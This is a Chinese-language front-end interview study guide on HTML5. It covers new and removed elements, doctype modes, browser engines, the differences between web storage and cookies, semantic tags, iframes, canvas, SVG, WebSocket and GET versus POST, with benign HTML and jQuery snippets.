多设备跨平台，可移植性好HTML5的优点主要在于，这个技术可以进行跨平台的使用。比如你开发了一款HTML5的游戏，你可以很轻易地移植到UC的开放平台、Opera的游戏中心、Facebook应用平台,甚至可以通过封装的技术发放到AppStore或GooglePlay上，所以它的跨平台性非常强大，这也是大多数人对HTML5有兴趣的主要原因。 自适应网页设计即“一次设计，普遍适用”，让同一张网页自动适应不同大小的屏幕，根据屏幕宽度，自动调整布局(layout)。 即时更新游戏客户端每次都要更新，很麻烦。可是更新HTML5游戏就好像更新页面一样，是马上的、即时的更新。 提高可用性和改进用户的友好体验 增加几个新的标签，这将有助于开发人员定义重要的内容 可以给站点带来更多的多媒体元素(视频和音频) 可以很好的替代FLASH和SilverlightSilverlight是一个跨浏览器、跨平台的插件，为网络带来下一代基于.NET媒体体验，和丰富的交互式应用程序。 当涉及到网站的抓取和索引的时候，对于SEO很友好SEO，即搜索引擎优化是一种利用搜索引擎的搜索规则来提高目前网站在有关搜索引擎内的自然排名的方式。 将被大量应用于移动应用程序和游戏缺点： 安全方面像之前Firefox4的web socket和透明代理的实现存在严重的安全问题，同时web storage、web socket这样的功能很容易被黑客利用，来盗取用户的信息和资料。 完善性方面许多特性各浏览器的支持程度也不一样。 技术门槛方面HTML5技术开发者工作的同时，有许多新的属性和API需要开发者学习，像web worker、web socket、web storage等新特性，甚至后台及浏览器原理的知识。这是机遇的同时也是巨大的挑战。 性能方面某些平台上的引擎问题导致HTML5性能低下. 浏览器兼容性方面IE9以下浏览器几乎不支持。 Doctype作用Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?告诉浏览器应该用什么文档类型规范来解析这个文档。doctype不存在或格式不正确会导致文档以混杂模式呈现。严格模式的排版和js运作模式是以浏览器最高标准运行。混杂模式， 页面以宽松的向后兼容的形式展示。参考博客DOCTYPE声明。 HTML5有哪些新特性、移除了哪些元素HTML5新增了27个元素，废弃了16个元素，根据现有的标准规范，把HTML5的元素按优先级定义为结构性元素、级块性元素、行内语义性元素和交互性元素4大类。结构性元素主要负责web上下文结构的定义：section：在 web 页面应用中，该元素也可以用于区域的章节描述。header：页面主体上的头部， header 元素往往在一对 body 元素中。footer：页面的底部（页脚），通常会标出网站的相关信息。nav：专门用于菜单导航、链接导航的元素，是 navigator 的缩写。article：用于表现一篇文章的主体内容，一般为文字集中显示的区域。 级块性元素主要完成web页面区域的划分，确保内容的有效分割。aside：用于表达注记、贴士、侧栏、摘要、插入的引用等作为补充主体的内容。figure：是对多个元素进行组合并展示的元素，通常与 ficaption 联合使用。code：表示一段代码块。dialog：用于表达人与人之间的对话，该元素包含 dt 和 dd 这两个组合元素， dt 用于表示说话者，而 dd 用来表示说话内容。 行内语义性元素主要完成web页面具体内容的引用和描述，是丰富内容展示的基础。meter：表示特定范围内的数值，可用于工资、数量、百分比等。time：表示时间值。progress：用来表示进度条，可通过对其 max 、min 、step 等属性进行控制，完成对进度的表示和监事。video：视频元素，用于支持和实现视频文件的直接播放，支持缓冲预载和多种视频媒体格式。audio：音频元素，用于支持和实现音频文件的直接播放，支持缓冲预载和多种音频媒体格式。 交互性元素主要用于功能性的内容表达，会有一定的内容和数据的关联，是各种事件的基础。details：用来表示一段具体的内容，但是内容默认可能不显示，通过某种手段（如单击）与 legend 交互才会显示出来。datagrid：用来控制客户端数据与显示，可以由动态脚本及时更新。menu：主要用于交互菜单（曾被废弃又被重新启用的元素）。command：用来处理命令按钮。 移除的元素纯表现的元素：&lt;basefont&gt; 默认字体，不设置字体，以此渲染; &lt;font&gt; 字体标签; &lt;center&gt;水平居中; &lt;u&gt;下划线; &lt;big&gt; 大字体; &lt;strike&gt;中横线; &lt;tt&gt;文本等宽;框架集：&lt;frameset&gt; &lt;noframes&gt; &lt;frame&gt; HTML5行内元素、块级元素、空元素行内元素a - 锚点abbr - 缩写br - 换行em - 强调strong - 粗体强调i - 斜体cite - 引用code - 计算机代码 ( 在引用源码的时候需要 )img - 图片span - 常用内联容器，定义文本内区块input - 输入框textarea - 多行文本输入框label - 表格标签块级元素div - 常用块级容易，也是 css layout 的主要标签p - 段落h1~h6 - 大标题form - 交互表单table - 表格ol - 排序表单ul - 非排序列表address - 地址blockquote - 块引用空元素&lt;br/&gt; //换行&lt;hr&gt; //分隔线&lt;input&gt; //文本框等&lt;img&gt; &lt;link&gt; &lt;meta&gt; 浏览器的内核分类IE: Trident 内核Firefox： Gecko 内核(开源)Safari: Webkit 内核(开源)Chrome: WebkitOpera: 以前是Presto内核，现已改用Blink内核(基于Webkit, Google与Opera Software共同开发) 对WEB标准以及W3C的理解与认识WEB标准 不是某一个标准，而是一系列标准的集合。网页主要由三部分组成：结构（Structure）、表现（Presentation）和行为（Behavior）。对应的标准也分三方面：结构化标准语言主要包括XHTML和XML，表现标准语言主要包括CSS，行为标准主要包括对象模型（如W3C DOM）、ECMAScript等。这些标准大部分由 万维网联盟 （W3C）起草和发布，也有一些是其他标准组织制订的标准，比如ECMA（European Computer Manufacturers Association）的ECMAScript标准。标签闭合、标签小写、不乱嵌套—》XHTML；提高搜索机器人搜索几率–》DOM；使用外 链css和 js 脚本—》结构行为表现的分离；文件下载与页面速度更快、内容能被更多的用户所访问、内容能被更广泛的设备所访问；容易维护、改版方便；提高网站易用性。 什么是WebGL,它有什么优点WebGL(Web Graphics Library) 是一种 3D 绘图标准，这种绘图技术标准允许把 JavaScript 和 OpenGL ES 2.0 结合在一起，通过增加 OpenGL ES 2.0 的一个 JavaScript 绑定，WebGL 可以为 HTML5 Canvas 提供硬件 3D 加速渲染，这样 Web 开发人员就可以借助系统显卡来在浏览器里更流畅地展示3D场景和模型了，还能创建复杂的导航和数据视觉化。WebGL 技术标准免去了开发网页专用渲染插件的麻烦，可被用于创建具有复杂 3D 结构的网站页面，甚至可以用来设计 3D 网页游戏等等。WebGL完美地解决了现有的 Web 交互式三维动画的两个问题：第一，它通过HTML脚本本身实现Web交互式三维动画的制作，无需任何浏览器插件支持;第二，它利用底层的图形硬件加速功能进行的图形渲染，是通过统一的、标准的、跨平台的OpenGL接口实现的。通俗的说WebGL是canvas绘图中的3D版本。因为原生的WebGL很复杂，我们经常会使用一些三方的库，如 three.js 等，这些库多数用于 HTML5 游戏开发。 cookie，sessionStorage 和 localStorage 的区别共同点：都是保存在浏览器端，且同源的。 区别： cookie数据始终在同源的http请求中携带（即使不需要），即cookie在浏览器和服务器间来回传递。而sessionStorage和localStorage不会自动把数据发给服务器，仅在本地保存。 cookie数据还有路径（path）的概念，可以限制cookie只属于某个路径下。 存储大小限制也不同。cookie数据不能超过4k，同时因为每次http请求都会携带cookie，所以cookie只适合保存很小的数据，如会话标识。sessionStorage和localStorage 虽然也有存储大小的限制，但比cookie大得多，可以达到5M或更大。 数据有效期不同。sessionStorage：仅在当前浏览器窗口关闭前有效，自然也就不可能持久保持；localStorage：始终有效，窗口或浏览器关闭也一直保存，因此用作持久数据；cookie只在设置的cookie过期时间之前一直有效，即使窗口或浏览器关闭。 作用域不同。sessionStorage不在不同的浏览器窗口中共享，即使是同一个页面；localStorage 在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的。 WebStorage 支持事件通知机制，可以将数据更新的通知发送给监听者。Web Storage 的 api 接口使用更方便。sessionStorage 和 localStorage 是 HTML5 Web Storage API 提供的，可以方便的在web请求之间保存数据。有了本地数据，就可以避免数据在浏览器和服务器间不必要地来回传递。sessionStorage、 localStorage 、 cookie 都是在浏览器端存储的数据，其中 sessionStorage 的概念很特别，引入了一个“浏览器窗口”的概念。 sessionStorage 是在同源的同窗口（或 tab ）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后，sessionStorage即被销毁。同时“独立”打开的不同窗口，即使是同一页面， sessionStorage 对象也是不同的。cookies 会发送到服务器端。其余两个不会。Cookie 每个域名存储量比较小（各浏览器不同，大致 4K ）；所有域名的存储量有限制（各浏览器不同，大致 4K ）； 有个数限制（各浏览器不同）；会随请求发送到服务器。LocalStorage 永久存储；单个域名存储量比较大（推荐 5MB ，各浏览器不同）；总体数量无限制。SessionStorage 只在 Session 内有效；存储量更大（推荐没有限制，但是实际上各浏览器也不同）。 对HTML语义化的理解 什么是 HTML 语义化&lt;基本上都是围绕着几个主要的标签，像标题（ H1~H6 ）、列表（ li ）、强调（ strong em ）等等 &gt;根据内容的结构化（内容语义化），选择合适的标签（代码语义化）便于开发者阅读和写出更优雅的代码的同时让浏览器的爬虫和机器很好地解析。 为什么要语义化为了在没有CSS的情况下，页面也能呈现出很好地内容结构、代码结构 : 为了裸奔时好看；用户体验：例如title、 alt 用于解释名词或解释图片信息、 label 标签的活用；有利于SEO：和搜索引擎建立良好沟通，有助于爬虫抓取更多的有效信息，爬虫依赖于标签来确定上下文和各个关键字的权重；方便其他设备解析（如屏幕阅读器、盲人阅读器、移动设备）以意义的方式来渲染网页；便于团队开发和维护，语义化更具可读性，是下一步网页的重要动向，遵循W3C标准的团队都遵循这个标准，可以减少差异化。 语义化标签&lt;header&gt;&lt;/header&gt; &lt;footer&gt;&lt;/footer&gt; &lt;nav&gt;&lt;/nav&gt; &lt;section&gt;&lt;/section&gt;&lt;article&gt;&lt;/article&gt; 用来在页面中表示一套结构完整且独立的内容部分&lt;aside&gt;&lt;/aside&gt; 主题的附属信息 ( 用途很广，主要就是一个附属内容 ) ，如果 article 里面为一篇文章的话，那么文章的作者以及信息内容就是这篇文章的附属内容了&lt;figure&gt;&lt;/figure&gt; 媒体元素，比如一些视频，图片等等&lt;datalist&gt;&lt;/datalist&gt; 选项列表，与 input 元素配合使用，来定义 input 可能的值&lt;details&gt;&lt;/details&gt; 用于描述文档或者文档某个部分的细节 link和@import的区别HTML代码link:&lt;link rel=&#39;stylesheet&#39; rev=&#39;stylesheet&#39; href=&#39;CSS文件 &#39; type=&#39;text/css&#39; media=&#39;all&#39; /&gt; HTML代码@import: &lt;style type=&apos;text/css&apos; media=&apos;screen&apos;&gt; @import url(&apos;CSS文件 &apos;); &lt;/style&gt; 首先link和import语法结构不同，前者是html标签，只能放入html源代码中使用，后者可看作为css样式，作用是引入css样式功能。 import在html使用时候需要&lt;style type=&quot;text/css&quot;&gt;标签，同时可以直接@import url(CSS文件路径地址)放入css文件或css代码里引入其它css文件。 本质上两者使用选择区别不大，但为了软件中编辑布局网页html代码，一般使用link较多，也推荐使用link。 两者都是外部引用CSS的方式，但是存在一定的区别：区别1： link 是 XHTML 标签，除了加载 CSS 外，还可以定义 RSS 等其他事务； @import 属于 CSS 范畴，只能加载 CSS 。区别2： link 引用 CSS 时，在页面载入时同时加载； @import 需要页面网页完全载入以后加载。区别3： link 是 XHTML 标签，无兼容问题； @import 是在 CSS2.1 提出的，低版本的浏览器不支持。区别4： link 支持使用 Javascript 控制 DOM 去改变样式；而 @import 不支持。区别5： link方式的样式权重 高于 @import的权重。 对SVG的理解SVG可缩放矢量图形（ Scalable Vector Graphics ）是基于可扩展标记语言（ XML ），用于描述二维矢量图形的一种图形格式。 SVG 是 W3C 在 2000 年 8 月制定的一种新的二维矢量图形格式，也是规范中的网络矢量图形标准。 SVG 严格遵从 XML 语法，并用文本格式的描述性语言来描述图像内容，因此是一种和图像分辨率无关的矢量图形格式。 SVG 于 2003 年 1 月 14 日成为 W3C 推荐标准。特点： (1)任意放缩：用户可以任意缩放图像显示，而不会破坏图像的清晰度、细节等。 (2)文本独立：SVG图像中的文字独立于图像，文字保留可编辑和可搜寻的状态。也不会再有字体的限制，用户系统即使没有安装某一字体，也会看到和他们制作时完全相同的画面。 (3)较小文件： 总体来讲，SVG文件比那些 GIF 和 JPEG 格式的文件要小很多，因而下载也很快。 (4)超强显示效果：SVG图像在屏幕上总是边缘清晰，它的清晰度适合任何屏幕分辨率和打印分辨率。 (5)超级颜色控制：SVG图像提供一个 1600 万种颜色的调色板，支持 ICC 颜色描述文件标准、 RGB 、线 X 填充、渐变和蒙版。 (6)交互 X 和智能化：SVG面临的主要问题一个是如何和已经占有重要市场份额的矢量图形格式 Flash 竞争的问题，另一个问题就是 SVG 的本地运行环境下的厂家支持程度。 Internet Explorer9，火狐，谷歌 Chrome ， Opera 和 Safari 都支持 SVG 。IE8和早期版本都需要一个插件 - 如 Adobe SVG 浏览器，这是免费提供的 HTML全局属性(global attribute)有哪些参考HTML 全局属性。例如class, id, style, title, lang等等。 超链接target属性的取值和作用target属性指定所链接的页面在浏览器窗口中的打开方式。参数值主要有：_blank ：浏览器总在一个新打开、未命名的窗口中载入目标文档。_parent ：在父框架集中打开被链接文档。如果含有该链接的框架不是嵌套的，则在浏览器全屏窗口中载入链接的文件，就象 _self 参数一。_self ：默认。在相同的框架中打开被链接文档。_top ： 在整个窗口中打开被链接文档。这个目标使得文档载入包含这个超链接的窗口，用 _top 目标将会清除所有被包含的框架并将文档载入整个浏览器窗口。framename：在指定的框架中打开被链接文档。 data- 属性的作用data- 属性赋予我们在所有 HTML 元素上嵌入自定义 data 属性的能力。data- 属性用于存储页面或应用程序的私有自定义数据。存储的（自定义）数据能够被页面的 JavaScript利用，以创建更好的用户体验（不进行 Ajax 调用或服务器端数据库查询）。 data-为HTML5新增的为前端开发者提供自定义的属性，这些属性集可以通过对象的 dataset 属性获取，不支持该属性的浏览器可以通过 getAttribute 方法获取：需要注意的是：data-之后的以连字符分割的多个单词组成的属性，获取的时候使用驼峰风格。 所有主流浏览器都支持 data-* 属性。即：当没有合适的属性和元素时，自定义的 data 属性是能够存储页面或 App 的私有的自定义数据。 浏览器内核主要分成两部分：渲染引擎(layout engineer或 Rendering Engine) 和 JS 引擎。渲染引擎：负责取得网页的内容（HTML、 XML 、图像等等）、整理讯息（例如加入 CSS 等），以及计算网页的显示方式，然后会输出至显示器或打印机。浏览器内核的不同对于网页的语法解释会有不同，所以渲染的效果也不相同。所有网页浏览器、电子邮件客户端以及其它需要编辑、显示网络内容的应用程序都需要内核。JS引擎： 解析和执行 javascript 来实现网页的动态效果。最开始渲染引擎和JS引擎并没有区分的很明确，后来JS引擎越来越独立，内核就倾向于只指渲染引擎。 iframe的缺点 iframe会阻塞主页面的 Onload 事件 搜索引擎的检索程序无法解读这种页面，不利于 SEO; iframe和主页面共享连接池，而浏览器对相同域的连接有限制，所以会影响页面的并行加载。 如果需要使用 iframe ，最好是通过 javascript动态给iframe添加 src 属性值，这样可以绕开以上两个问题。 历史上，iframe 常被用于复用部分界面，但是多数情况下并不合适。现在，应该使用 iframe 的例子如： 沙箱隔离。参考 写js沙箱原来如此简单 引用第三方内容。 独立的带有交互的内容，比如幻灯片。 需要保持独立焦点和历史管理的子窗口，如复杂的Web应用。 使用 iframe 是不是一个好的用法（good practice），不能一概而论，但是可以肯定是，现在的大部分网站避免采用这种方式的。比较早期的网站使用iframe，主要是用于导航栏（navigator）。因为一个网站很多页面的导航栏部分是相同的，在避免切换页面的时候重复下载，将导航栏和正文分开在 iframe 中，是一个方便的做法。同时带来的不利是，默认情况下，使用了 iframe 的网站的URL不会随着页面的变化而变化。这就意味着一旦刷新，网站可能又回到首页。那么现在的网站是如何解决不同页面使用相同的 navigator 而避免重复编码呢？不同后台技术都有自己的方法，比如 ASP 有 SSI，PHP 有 require、require_once 或 include 函数，JSP 也有 include 指令。iframe 一直是浏览器标准规范之一，只有很早期的浏览器不支持 iframe，现在几乎已绝迹。所以从兼容性上来说，iframe 是没问题的。那么现在什么时候会用到 iframe 呢？因为 iframe 的页面和父页面（parent）是分开的，所以它意味着，这是一个独立的区域，不受 parent 的 CSS 或者全局的 JavaScript 的影响。典型的，比如所见即所得的网页编辑器（WYSIWYG Online HTML Editor），因为它们需要 reset 自己的 CSS 到自己的标准，而不被 parent CSS 的 override。 顺便说一下，知乎的这个编辑器不是用 iframe，它使用了一种叫 contentEditable 的属性，用来启用页面元素的编辑，在早期版本 IE 下不支持的。正是因为刚刚提到的 iframe 等于新建了一个全新的，不受 parent 影响的页面上下文，所以在一定程度上，类似于沙箱隔离（sandbox）。除此之外，如果有可以不用 iframe 来解决的问题，还是避免使用 iframe。替代方案一般就是动态语言的 include 机制、ajax 动态填充内容，以及以后会普及的 contentEditable。 label标签的作用对鼠标用户而言增进了可用性。label标签用来定义表单控制间的关系 , 当用户选择该标签时，浏览器会自动将焦点转到和标签相关的表单控件上。 &lt;label for=&apos;Name&apos;&gt;Number:&lt;/label&gt; &lt;input type=&quot;text&quot; name=&quot;Name&quot; id=&quot;Name&quot;/&gt; 注意:label的for属性值要与后面对应的input标签id属性值相同。 浏览器内多个标签页之间的通信调用localstorge、cookies等本地存储方式。方法一：localstorge在一个标签页里被添加、修改或删除时，都会触发一个storage事件，通过在另一个标签页里监听storage事件，即可得到localstorge存储的值，实现不同标签页之间的通信。例如标签页1： &lt;input id=&quot;name&quot;&gt; &lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;提交&quot;&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(function(){ $(&quot;#btn&quot;).click(function(){ var name=$(&quot;#name&quot;).val(); localStorage.setItem(&quot;name&quot;, name); }); }); &lt;/script&gt; 标签页2： &lt;input id=&quot;name&quot;&gt; &lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;提交&quot;&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(function(){ $(&quot;#btn&quot;).click(function(){ var name=$(&quot;#name&quot;).val(); localStorage.setItem(&quot;name&quot;, name); }); }); &lt;/script&gt; 方法二：使用cookie+setInterval，将要传递的信息存储在cookie中，每隔一定时间读取cookie信息，即可随时获取要传递的信息。标签页1： &lt;input id=&quot;name&quot;&gt; &lt;input type=&quot;button&quot; id=&quot;btn&quot; value=&quot;提交&quot;&gt; &lt;script type=&quot;text/javascript&quot;&gt; $(function(){ $(&quot;#btn&quot;).click(function(){ var name=$(&quot;#name&quot;).val(); document.cookie=&quot;name=&quot;+name; }); }); &lt;/script&gt; 标签页2： &lt;script type=&quot;text/javascript&quot;&gt; $(function(){ function getCookie(key) { return JSON.parse(&quot;{\&quot;&quot; + document.cookie.replace(/;\s+/gim,&quot;\&quot;,\&quot;&quot;).replace(/=/gim, &quot;\&quot;:\&quot;&quot;) + &quot;\&quot;}&quot;)[key]; } setInterval(function(){ console.log(&quot;name=&quot; + getCookie(&quot;name&quot;)); }, 10000); }); &lt;/script&gt; 在页面上实现一个圆形的可点击区域第一种 使用image map &lt;img id=&quot;blue&quot; class=&quot;click-area&quot; src=&quot;blue.gif&quot; usemap=&quot;#Map&quot; /&gt; &lt;map name=&quot;Map&quot; id=&quot;Map&quot; class=&quot;click-area&quot;&gt; &lt;area shape=&quot;circle&quot; coords=&quot;50,50,50&quot;/&gt; &lt;/map&gt; #blue{ cursor:pointer; width:100px; height:100px; }第二种 使用CSS border-radius &lt;div id=&quot;red&quot; class=&quot;click-area&quot; &gt;&lt;/div&gt; #red{ cursor:pointer; background:red; width:100px; height:100px; border-radius:50%; } 第三种 使用js检测鼠标位置,获取鼠标点击位置坐标，判断其到圆点的距离是否不大于圆的半径，来判断点击位置是否在圆内。 &lt;div id=&quot;yellow&quot; class=&quot;click-area&quot; &gt;&lt;/div&gt; $(&quot;#yellow&quot;).on(&apos;click&apos;,function(e) { var r = 50; var x1 = $(this).offset().left+$(this).width()/2; var y1 = $(this).offset().top+$(this).height()/2; var x2= e.clientX; var y2= e.clientY; var distance = Math.abs(Math.sqrt(Math.pow(x2 - x1, 2) + Math.pow(y2 - y1, 2))); if (distance &lt;= 50) alert(&quot;Yes!&quot;); }); title与h3、b与strong、及i与em的区别&lt;strong&gt; 表示html页面上的强调（emphasized text）， &lt;em&gt; 表示句子中的强调（即强调语义）1.b和strong的区别盲人朋友使用阅读设备阅读网络时：&lt;strong&gt;会重读，&lt;b&gt;不会。两者虽然在网页中显示效果一样，但实际目的不同。&lt;b&gt;这个标签对应 bold，即文本加粗，其目的仅仅是为了加粗显示文本，是一种样式／风格需求；&lt;strong&gt;这个标签意思是加强字符的语气，表示该文本比较重要，提醒读者／终端注意。为了达到这个目的，浏览器等终端将其加粗显示；总结：&lt;b&gt;为了加粗而加粗，&lt;strong&gt;为了标明重点而加粗，也可以用其它方式来强调，比如下划线，比如字体加大，比如红色，等等，可以通过css来改变strong的具体表现。2.i和em的区别同样，I是Italic(斜体)，而em是emphasize(强调)。3.title与h1的联系与区别：从网站角度看，title更重于网站信息。title可以直接告诉搜索引擎和用户这个网站是关于什么主题和内容的。从文章角度看，h1则是用于概括文章主题。用户进入内容页，想看到的当然就是文章的内容，h1文章标题就是最重要的。文章标题最好只有一个，多个h1会导致搜索引擎不知道这个页面哪个标题内容最重要，导致淡化这个页面的标题和关键词，起不到突出主题的效果。区别：h1突出文章主题，面对用户，更突出其视觉效果，突出网站标题或关键字用title。一篇文章，一个页面最好只用一个h1，多个h1会稀释主题。一个网站可以有多个title,最好一个单页用一个title，以便突出网站页面主体信息，从seo看，title权重比h1高，适用性比h1广。标记了h1的文字页面给予的权重会比页面内其他权重高很多。一个好的网站是h1和title并存，既突出h1文章主题，又突出网站主题和关键字。达到双重优化网站的效果。 不使用border画出1px高的线，考虑兼容性实现不使用 border 画出1px高的线，在不同浏览器的标准模式与怪异模式下都能保持一致的效果？ &lt;div style=&quot;width:100%;height:1px;background-color:black&quot;&gt;&lt;/div&gt; src属性与href属性的区别src用于替换当前元素， href 用于在当前文档和引用资源之间确立联系。src是 source 的缩写，指向外部资源的位置，指向的内容将会嵌入到文档中当前标签所在位置；在请求 src 资源时会将其指向的资源下载并应用到文档内，例如 js 脚本， img 图片和 frame 等元素。&lt;script src =&#39;js.js&#39;&gt;&lt;/script&gt;，当浏览器解析到该元素时，会暂停其他资源的下载和处理，直到将该资源加载、编译、执行完毕，图片和框架等元素也如此，类似于将所指向资源嵌入当前标签内。这也是为什么将js脚本放在底部而不是头部。 href是 Hypertext Reference的缩写，指向网络资源所在位置，建立和当前元素（锚点）或当前文档（链接）之间的连接，如果我们在文档中添加&lt;link href=&#39;common.css&#39; rel=&#39;stylesheet&#39;/&gt;，那么浏览器会识别该文档为css文件，就会并行下载资源并且不会停止对当前文档的处理。这也是为什么建议使用 link 方式来加载 css ，而不是使用 @import 方式。 对canvas的理解canvas是HTML5中新增一个HTML5标签与操作canvas的javascript API，它可以实现在网页中完成动态的2D与3D图像技术。canvas标记和 SVG以及 VML 之间的一个重要的不同是，有一个基于 JavaScript 的绘图 API，而 SVG 和 VML 使用一个 XML 文档来描述绘图。SVG 绘图很容易编辑与生成，但功能明显要弱一些。 canvas可以完成动画、游戏、图表、图像处理等原来需要Flash完成的一些功能。 WebSocket与消息推送B/S架构的系统多使用HTTP协议。HTTP协议的特点： 1 无状态协议； 2 用于通过 Internet 发送请求消息和响应消息； 3 使用端口接收和发送消息，默认为80端口； 4 底层通信还是使用SocketHTTP协议决定了服务器与客户端之间的连接方式，无法直接实现消息推送（ F5 已坏） , 一些变相的解决办法实现 双向通信与消息推送 ：轮询： 客户端定时向服务器发送Ajax请求，服务器接到请求后马上返回响应信息并关闭连接。优点：后端程序编写比较容易。缺点：请求中有大半是无用，浪费带宽和服务器资源。实例：适于小型应用长轮询： 客户端向服务器发送Ajax请求，服务器接到请求后 hold 住连接，直到有新消息才返回响应信息并关闭连接，客户端处理完响应信息后再向服务器发送新的请求。优点：在无消息的情况下不会频繁的请求，耗费资小。缺点：服务器hold连接会消耗资源，返回数据顺序无保证，难于管理维护。 Comet 异步的 ashx ，实例：WebQQ、 Hi 网页版、 Facebook IM长连接： 在页面里嵌入一个隐蔵iframe，将这个隐蔵 iframe 的 src 属性设为对一个长连接的请求或是采用xhr请求，服务器端就能源源不断地往客户端输入数据。优点：消息即时到达，不发无用请求；管理起来也相对便。缺点：服务器维护一个长连接会增加开销。实例：Gmail聊天Flash Socket： 在页面中内嵌入一个使用了 Socket 类的 Flash 程序， JavaScript 通过调用此 Flash 程序提供的 Socket 接口与服务器端的 Socket 接口进行通信， JavaScript 在收到服务器端传送的信息后控制页面的显示。优点：实现真正的即时通信，而不是伪即时。缺点：客户端必须安装Flash插件；非 HTTP 协议，无法自动穿越防火墙。实例：网络互动游戏。Websocket:WebSocket是 HTML5 开始提供的一种浏览器与服务器间进行全双工通讯的网络技术。依靠这种技术可以实现客户端和服务器端的长连接，双向实时通信。特点:事件驱动；异步；使用 ws 或者 wss 协议的客户端 socket；能够实现真正意义上的推送功能缺点：少部分浏览器不支持，浏览器支持的程度与方式有区别参考文章：WebSocket 教程-阮一峰html5-websocket初探 img的title和alt的区别alt 是给搜索引擎识别，在图像无法显示时的替代文本； alt属性有利于SEO，是搜索引擎搜录时判断图片与文字是否相关的重要依据。title 是关于元素的注释信息，主要是给用户解读。当鼠标放到文字或是图片上时有title文字显示。参考文章：img图片标签alt和title属性的区别 表单的基本组成组成：表单标签、表单域、表单按钮。 a、表单标签：这里面包含了处理表单数据所用 CGI 程序的 URL, 以及数据提交到服务器的方法。b、表单域：包含了文本框、密码框、隐藏域、多行文本框、复选框、单选框、下拉选择框、和文件上传框等。c、表单按钮：包括提交按钮，复位按钮和一般按钮；用于将数据传送到服务器上的 CGI 脚本或者取消输入，还可以用表单按钮来控制其他定义了处理脚本的处理工作。主要用途：表单在网页中主要负责数据采集的功能，和向服务器传送数据。 &lt;form action=&quot;#&quot; method=&quot;post&quot; id=&quot;regForm&quot;&gt; &lt;fieldset&gt; &lt;legend&gt;个人基本信息&lt;/legend&gt; &lt;div&gt; &lt;label for=&quot;userName&quot;&gt;名称：&lt;/label&gt; &lt;input id=&quot;useName&quot; type=&quot;text&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;passWord&quot;&gt;密码：&lt;/label&gt; &lt;input id=&quot;passWord&quot; type=&quot;password&quot; /&gt; &lt;/div&gt; &lt;div&gt; &lt;label for=&quot;msg&quot;&gt;详细信息：&lt;/label&gt; &lt;textarea id=&quot;msg&quot;&gt;&lt;/textarea&gt; &lt;/div&gt; &lt;/fieldset&gt; &lt;/form&gt; form标签： &lt;form action=&quot;表单提交的地址&quot; method=&quot;表单提交的方法&quot; id=&quot;&quot; class=&quot;&quot;&gt;fieldset标签：作用是将表单内相关元素分组；将表单内容的一部分打包，生成一组表单的字段;在一个form表单中，可以有一个或者多个fielset标签。legend标签： 作用是为fieldset标签定义标题。label标签： 该标签在页面中使用不会为用户呈现任何特殊效果，但是却可以很好地为鼠标用户改进了可用性。其作用是为input元素定义标注，要注意的是label中的for属性应与input中的id属性一致，如上述代码所示。input标签： 输入框，其中可以根据type的属性值改变输入框的作用。例如：&lt;input type=&quot;text&quot;/&gt; 是文本框，还可以是密码输入框、复选框、单选框等等。 表单提交中Get和Post方式的区别原理性区别： Http 定义的与服务器交互的四种基本方法，增删改查（ put delete post get ）；从定义而言 get 用于信息获取（状态不做迁移），而且是安全幂等的（不修改信息、同一 url 多次请求结果一致），但有时候并不严格遵循规定，比如腾讯新闻的刷新操作，因为从 server端来讲，数据状态并没有发生任何改变 ，所以也可以算成是幂等； post 可以修改服务器上的资源请求（资源的状态迁移），比如新闻评论的提交，提交前后资源被修改了。 关于幂等与否只是 http 的规定，实际中要看服务器端怎么写。表象上的区别： 提交的安全性不同： Get 将表单中的数据按照 variable=value 的形式，添加到 action 所指向的 URL 后面，并且两者使用”? “连接，而各个变量之间使用”&amp;”连接（明文提交）； Post 是将表单中的数据放在 form 的数据体中，按照变量和值相对应的方式，传递到 action 所指向 URL （依照表单提交）。 Get 传输的数据量小（ 1024 字节），这主要是因为受 URL 长度限制； URL 长度在 http 协议中没有限制，只是 IE 对 URL 有长度限制，其他浏览器取决于操作系统，理论上没有限制。 Post 可以传输大量的数据（ 2M ），理论上 http 没有限制数据量长度，服务器处理程序的处理能力限制了表单域长度，而有限制 Get 限制 Form 表单的数据集的值必须为 ASCII 字符；而 Post 支持整个 ISO10646 字符集。 传输信息所在 http 中的位置不同： Post 的信息作为 http 请求的内容，而 Get 是在 Http 头部传输的， get 请求可以有 body 但大多数服务器不会解析 get 请求的 body 。 (1)、 get 是从服务器上获取数据， post 是向服务器传送数据。(2)、 get 是把参数数据队列加到提交表单的 ACTION 属性所指的 URL 中，值和表单内各个字段一一对应，在 URL 中可以看到。 post 是通过 HTTP post 机制，将表单内各个字段与其内容放置在 HTML HEADER 内一起传送到 ACTION 属性所指的 URL 地址 , 用户看不到这个过程。(3)、对于 get 方式，服务器端用 Request.QueryString 获取变量的值，对于 post 方式，服务器端用 Request.Form 获取提交的数据。(4)、 get 传送的数据量较小，不能大于 2KB 。 post 传送的数据量较大，一般被默认为不受限制。但理论上， IIS4 中最大量为 80KB ， IIS5 中为 100KB 。(5)、 get 安全性低， post 安全性较高。 关于HTML5标签的几个知识点HTML5新增的表单元素：datalist 元素：datalist 元素规定输入域的选项列表；列表是通过 datalist 内的 option 元素创建的,option 元素永远都要设置 value 属性；如需把 datalist 绑定到输入域，请用输入域的 list 属性引用 datalist 的 id。keygen 元素:keygen 元素的作用是提供一种验证用户的可靠方法;keygen 元素是密钥对生成器（key-pair generator）。当提交表单时，会生成两个键，一个是私钥，一个公钥。私钥（private key）存储于客户端，公钥（public key）则被发送到服务器。公钥可用于之后验证用户的客户端证书（client certificate）。目前，浏览器对此元素的糟糕的支持度不足以使其成为一种有用的安全标准。output 元素:output 元素用于不同类型的输出，比如计算或脚本输出。HTML5废弃的标签：第一类：表现性元素basefont big center font s strike tt u等。建议用语义正确的元素代替他们，并使用CSS来确保渲染后的效果第二类：框架类元素因框架有很多可用性及可访问性问题，HTML5规范将以下元素移除:frame frameset 